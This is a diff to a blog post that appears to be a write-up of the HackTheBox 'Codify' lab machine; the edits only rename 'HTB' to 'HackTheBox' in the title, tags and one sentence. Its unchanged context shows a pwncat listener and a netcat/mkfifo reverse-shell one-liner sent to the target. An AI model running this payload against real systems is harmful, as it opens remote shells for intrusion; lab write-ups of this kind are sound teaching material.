@@ -1,8 +1,8 @@
 ---
 layout: post
-title: Codify HTB - Writeup
-categories: [HTB]
-tags: [htb,web,htb easy,linux,cve,rce,sql,hash cracking,scripting,bash,python]
+title: Codify HackTheBox Machine - Writeup
+categories: [HackTheBox Machines]
+tags: [hackthebox,web,hackthebox easy,linux,cve,rce,sql,hash cracking,scripting,bash,python]
 image:
   path: /images/htb/easy/codify/icon.png
 ---
@@ -87,7 +87,7 @@ $ pwncat-cs
 (local) pwncat$
 ```
 
-I go to [revshells.com](https://revshells.com) to craft a payload to send to the server, using my HTB private IP and port 4444.
+I go to [revshells.com](https://revshells.com) to craft a payload to send to the server, using my HackTheBox private IP and port 4444.
 
 I use the following payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.***.*** 4444 >/tmp/f`
 
